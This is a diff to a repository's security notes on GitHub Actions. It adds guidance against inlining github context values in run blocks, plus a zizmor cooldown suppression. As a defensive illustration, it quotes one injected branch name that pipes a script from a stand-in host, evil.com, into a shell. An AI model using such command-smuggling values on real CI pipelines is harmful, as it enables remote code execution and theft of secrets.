@@ -55,6 +55,32 @@ A commit SHA cannot be reassigned. Even if the tag \`v6\` is repointed to malici
 
 The trailing-comment placement matters — Dependabot updates the SHA + comment together. Other styles go stale.
 
+### No GitHub-context interpolation in `run:` blocks
+Workflow `run:` script bodies must NEVER inline `${{ github.<thing> }}` directly — that's a code-injection vector when the value is attacker-controllable (e.g. a malicious PR branch named `; curl evil.com | sh; #`). Pass them through `env:` and read shell variables instead:
+
+```yaml
+# ✗ Bad — github.head_ref interpolated into shell
+- run: |
+    git checkout "${{ github.head_ref }}"
+
+# ✓ Good — env var, no template injection surface
+- run: |
+    git checkout "$BRANCH"
+  env:
+    BRANCH: ${{ github.head_ref }}
+```
+
+Safe to interpolate inline: top-level `env:`, `if:` conditions, action `with:` inputs, `concurrency.group`. Risky: anything that ends up parsed by a shell.
+
+zizmor's `template-injection` rule catches this in CI.
+
+### Cooldown — zizmor mismatch (intentional)
+zizmor's `dependabot-cooldown` rule wants ≥7 days. Our `.npmrc` mirrors a 1-day window (24h) — the cooldown window is a tradeoff between catching bad releases and not blocking urgent fixes. Suppress with an inline ignore so zizmor stays useful for the rules that matter:
+
+```yaml
+default-days: 1 # zizmor: ignore[dependabot-cooldown]
+```
+
 ### Trust policy
 `package.json` sets `pnpm.trustPolicy: "no-downgrade"` (pnpm ≥ 10.21). Refuses install if a package's trust level decreased compared to previously installed versions (e.g. previously published with provenance, new version doesn't). Catches the common compromise pattern where an attacker republishes from a stolen account without the original signing setup.
 
